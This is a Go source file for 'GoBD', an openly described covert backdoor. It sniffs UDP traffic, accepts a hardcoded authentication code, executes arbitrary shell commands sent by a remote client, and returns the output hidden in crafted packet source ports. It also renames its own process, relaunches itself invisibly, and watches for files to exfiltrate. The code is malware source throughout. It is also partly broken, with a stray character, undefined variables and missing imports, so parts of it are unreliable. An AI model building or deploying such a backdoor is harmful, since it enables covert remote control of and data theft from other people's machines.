package main
/* bdmain.go
PROGRAM: GoBD
AUTHOR: Ramzi Chennafi
DATE: October 18 2015
FUNCTIONS:
 main()
 SetProcessName(string) error
 intiateClient(ip string, port, lport int)
 grabOutput(serverConn *net.UDPConn) 
 intiateServer(iface string, port, lport int)
 handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int)
 executeServerCommand(data, ip string, port int)
 executeCommand(cmd, ip string, port int)
 sendEncryptedData(port int, data, ip string)
 checkError(err error) 
 GetLocalIP() string

ABOUT:
  bdmain.go is the central code body for the GoBD program. Contained within are all methods related to starting and stopping 
 the server and client. The communications are done using UDP  including packet sniffing to create backdoor communications. 
 All messages are encrypted using AES-256 and client to sever connections require authentication using the control code.

USAGE:
 Type GoBD --help. While authenticated type ?help for more info on client options. Requires a backdoor to connect to. These
 two programs can be used across any operating system, commands will be executed the same.
*/
import(
	"os"
	"bytes"
	"os/exec"
	"reflect"
	"unsafe"
	"flag"
	"encoding/binary"
	"fmt"
	"strings"
	"strconv"
	"bufio"
	"github.com/google/gopacket/layers"
	"golang.org/x/crypto/ssh/terminal"
	"runtime"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
)

const passwd = "D"; //The authentication code
const MAX_PORT = 45535
const CLIENT = 1
const SERVER = 0
const helpStr = "Client Usage Help\n" +"=================================\n" +
"EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
"Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"

var authenticatedAddr string //Currently authenticated address
var handle *pcap.Handle
/* 
    FUNCTION: func main()
    RETURNS: Nothing
    
    ABOUT:
    The main loop of program execution. Allows for retreiving of flags and intiation of client / server.
*/
func main(){

	//SetProcessName("dnsp")

	//flags
	modePtr      := flag.String("mode", "client", "The mode of the application, may either be" +
		         " client or server. Defaults to client.")
	ipPtr        := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.")
	portPtr      := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.")
	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.")
	lPortPtr     := flag.Int("lport", 3321, "The port for the client to listen on.")
	hiddenPtr    := flag.String("visible", "false", "Determines whether the server will be hidden or not. true for visible and false for invisible.")
	//flags

	flag.Parse()
	
	if *hiddenPtr == "false" && *modePtr == "server" {

		var procAttr os.ProcAttr 
		procAttr.Files = []*os.File{os.Stdin, nil, nil} 
		
		arguments := make([]string, 7)
		arguments[0] = ""
		arguments[1] = fmt.Sprintf("-mode=%s", *modePtr)
		arguments[2] = fmt.Sprintf("-ip=%s", *ipPtr)
		arguments[3] = fmt.Sprintf("-port=%d", *portPtr)
		arguments[4] = fmt.Sprintf("-iface=%s", *interfacePtr)
		arguments[5] = fmt.Sprintf("-lport=%d", *lPortPtr)
		arguments[6] = fmt.Sprint("-visible=invalid")
		if runtime.GOOS == "windows"{
			_, err := os.StartProcess("GoBD", arguments, &procAttr)
			checkError(err)
		} else {
			_, err := os.StartProcess("./GoBD", arguments, &procAttr)
			checkError(err)
		}
		return
	}

	intiateTools()
	
	handle, err := pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
	checkError(err)

	switch *modePtr {
	case "client":
		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr)
		intiateClient(*ipPtr, *portPtr, *lPortPtr)
		break
	case "server":
		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr)
		beginServerListen(*portPtr, *lPortPtr)
	}
}
/* 
    FUNCTION: func intiateClient(ip string, port, lport in)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                int lport : port to listen for data on

    ABOUT:
    Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
    server if correct. Then idles waiting for user input and server output. Also provides help documentation
*/
func intiateClient(ip string, port, lport int){
	
	for {
		fmt.Print("Please input the authentication code: ");
		var authstr string;
		if runtime.GOOS == "windows" {
			reader := bufio.NewReader(os.Stdin);
			authstr, _ := reader.ReadString('\n');
			authstr = strings.TrimSpace(authstr);
		} else {			
			authcode, _ := terminal.ReadPassword(0);
			authstr = string(authcode);
		}
		
		if authstr == passwd {
			sendEncryptedData(port, authstr, ip);
			break;
		}
		fmt.Print("\nInvalid authentication code, try again.\n");
	}
 
	fmt.Printf("Authentication accepted, you may now send commands.\n");
	fmt.Printf("Type ?help for more info on sending client commands.\n");

	go beginClientListen(ip, port, lport)
	
	for {
		reader := bufio.NewReader(os.Stdin);
		input, _ := reader.ReadString('\n');
		input = strings.TrimSpace(input);
		if strings.HasPrefix(input, "!") {
			sendEncryptedData(port, "[BD]" + input, ip);
		} else if input == "?help" {
			fmt.Print(helpStr);
			continue;
		} else {
			sendEncryptedData(port, "[EXEC]" + input, ip);
		}
	}
}
/* 
    FUNCTION: func intiateServer(iface string, port, lport in)
    RETURNS: Nothing
    ARGUMENTS: 
                string iface : the net interface to listen on
                int port : port to send data to
                int lport : port to listen for data on

    ABOUT:
    Performs packet sniffing using gopacket (libpcap). 
*/
func beginServerListen(port, lport int){

	var ipLayer layers.IPv4
	var ethLayer layers.Ethernet
	var udpLayer layers.UDP
	var data []byte
	
	i := 0
	pCount := 0
	size := make([]byte, 4)
	
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
	decoded := make([]gopacket.LayerType, 0, 3);
	
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		checkError(err);

		err = parser.DecodeLayers(packet.Data(), &decoded)
		checkError(err);
		
		if ipLayer.SrcIP.String() == authenticatedAddr {

			buf := make([]byte, 2)
			binary.LittleEndian.PutUint16(buf, uint16(udpLayer.SrcPort))
			
			if pCount < 2 {
				tempSlice := size[i:i+1]
				copy(tempSlice, buf)
				pCount = pCount + 1
				i = i + 2
				continue;
			}

			if pCount >= 2 {
				tempSlice := data[i:i+1]
				copy(data[i:i+1], buf)
				pCount = pCount + 1
				i = i + 2
				continue
			}

			var num uint32
			err := binary.Read(bytes.NewBuffer(size[:]), binary.LittleEndian, &num)
			checkError(err)
			if pCount == num / uint32(2) {
				pCount = 0
				i = 0

				data := decrypt_data(data)

				if strings.HasPrefix(data, "[EXEC]") {
					executeCommand(data, ipLayer.SrcIP.String(), port);
				}
				if strings.HasPrefix(data, "[BD]") {
					executeServerCommand(data, ipLayer.SrcIP.String(), port);
				}

			}
		} else if udpLayer.DstPort == lport {
			
			data := decrypt_data([]byte(udpLayer.Payload))

			if data == passwd {
				fmt.Printf("Authcode recieved, opening communication with %s\n", ipLayer.SrcIP.String());
				authenticatedAddr = ipLayer.SrcIP.String();
			}
		}
	}			
}
func beginClientListen(ip string, port, lport int) {
	var ipLayer layers.IPv4
	var ethLayer layers.Ethernet
	var udpLayer layers.UDP
	var data []byte

	i := 0
	pCount := 0
	currSize := make([]byte, 4)
	localip := GetLocalHost();

	parser = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
	decoded := make([]gopacket.LayerType, 0, 3);
	
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		checkError(err);

		err = parser.DecodeLayers(packet, &decoded)
		checkError(err);

		if ipLayer.SrcIP.String() == ip && udpLayer.DstPort == lport {

			buf := make([]byte, 2)
			binary.LittleEndian.PutUint16(buf, uint16(udpLayer.SrcPort))
			
			if pCount < 2 {
				tempSlice := size[i:i+1]
				copy(tempSlice, buf)
				pCount = pCount + 1
				i = i + 2
				continue;
			}

			if pCount >= 2 {
				tempSlice := data[i:i+1]
				copy(data[i:i+1], buf)
				pCount = pCount + 1
				i = i + 2
			}
			
			if pCount == (strconv.ParseInt(size, 10, 32))/2 {
				pCount = 0
				i = 0
				data := decrypt_data([]byte(data))
				fmt.Print(data);
			}
		}
	}
}
/* 
    FUNCTION: func  executeServerCommand(data, ip string, port int) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                string data : command to execute

    ABOUT:
    Executes incoming client commands on the GoBD program itself. Current commands include:
              setprocess [name] - sets the process name of the gobd program
              exit - exits the gobd program cleanly
*/
func executeServerCommand(data, ip string, port int) {

	fmt.Printf("%s\n", data);

	tempstr := strings.SplitAfterN(data, "[BD]!", 2);
	args := strings.Split(tempstr[1], " ");

	var out string;
	
	switch args[0] {
	case "setprocess" :
		err := SetProcessName(args[1]);
		if err != nil {
			fmt.Printf("%s\n", err);
			out = fmt.Sprintf("%s", err);
		} else {
			out = fmt.Sprintf("Process name set to %s\n", args[1]);
		}
		break;
		
	case "monitor":
		sendEncryptedData(port, "Monitoring for requested file\n", ip);
		go monitorFile(ip, args[1]);
		break;

	case "exit" :
		sendEncryptedData(port, "Server exiting...\n", ip);
		os.Exit(0);
		break;

	default:
		out = "Not a valid command.\n";
	}

	fmt.Printf("%s", out);

	sendEncryptedData(port, out, ip);	
}

func monitorFile(ip, filename string){

	for {
		time.Sleep(1000 * time.Millasecond);
		err := os.Stat(filename)
		if os.IsNotExist(err) {
			continue;
		}
		
		dat, err := ioutil.ReadFile(filename);
		checkError(err);

		//+1 to the port notifies that its a file transfer
		sendEncryptedFile(port + 1, string(dat), ip);
		return;
	}
}
/* 
    FUNCTION: func  executeCommand(cmd, ip string, port int) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                string cmd : command to execute

    ABOUT:
    Executes incoming client commands on the host machine.
*/
func executeCommand(cmd, ip string, port int){
	
	fmt.Printf("%s\n", cmd);

	tempstr := strings.SplitAfterN(cmd, "[EXEC]", 2);
	args := strings.Split(tempstr[1], " ");
	
	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
	k
	fmt.Printf("OUT:\n%s", out);

	sendEncryptedData(port, string(out[:]), ip);
}
/* 
    FUNCTION: sendEncryptedData(port int, data, ip string)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to

    ABOUT:
    Sends encrypted data over UDP to the spcified port and ip.
*/
func sendEncryptedData(port int, data, ip string) {

	size := len(data)
	buf := make([]byte, 4)
	err := binary.Write(buf, binary.LittleEndian, size)
	if err != nil {
		fmt.Println("binary.Write failed:", err)
	}
	
	cryptdata := encrypt_data(data)

	buffer := craftPacket(buf[0:1], ip, port)
	err = handle.WritePacketData(buffer)
	checkError(err)

	buffer = craftPacket(buf[2:3], ip, port)
	err = handle.WritePacketData(buffer)
	checkError(err)
	
	//make data write to source port, continue till end
	for i := 0; i < size; i = i + 2 {

		buffer := craftPacket(cryptdata[i:(i+1)], ip, port);

		if buffer == nil { // if original query was invalid
			fmt.Print("Buffer error, returned nil.\n")
			continue
		}

		err = handle.WritePacketData(buffer);
		checkError(err);
	}
}

func craftPacket(data, ip string, port int) []byte {

	ethernetLayer = packet.Layer(layers.LayerTypeEthernet)
	ipLayer = packet.Layer(layers.LayerTypeIPv4)
	udpLayer = packet.Layer(layers.LayerTypeUDP)
	
	ipAddr, _, err = net.ParseCIDR(ip)
	checkError(err)
	
	ipLayer.SrcIP = GetLocalIP()
	ipLayer.DstIP = ipAddr

	udpLayer.SrcPort = MAX_PORT - strconv.ParseUint(data, 10, 16)
	udpLayer.DstPort = port
	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
	checkError(err)
	
	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	};

	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer);
	checkError(err);

	return buf.Bytes()
}
///Utility Functions//////////////////////////////////////////
/* 
    FUNCTION: func checkError(err error)
    RETURNS: Nothing
    ARGUMENTS: 
              err error : the error code to check

    ABOUT:
    Checks an error code, panics if the error is not nil.
*/
func checkError(err error){
	if err != nil {
		panic(err)
	}
}
/* 
    FUNCTION: func SetProcessName(name string) error
    RETURNS: err Error, if anything goes wrong
    ARGUMENTS: 
                string name: the new process name to set the program to

    ABOUT:
    Sets the process name of the GoBD program to name.
*/
func SetProcessName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];

    n := copy(argv0, name);
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}

/* 
    FUNCTION: func GetLocalIP() string
    RETURNS: String, the local ip 

    ABOUT:
    Grabs the local ip of the host system.
*/
func GetLocalIP() string {
    addrs, err := net.InterfaceAddrs();
	checkError(err);
	
    for _, address := range addrs {
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String();
            }
        }
    }
	
    return "";
}
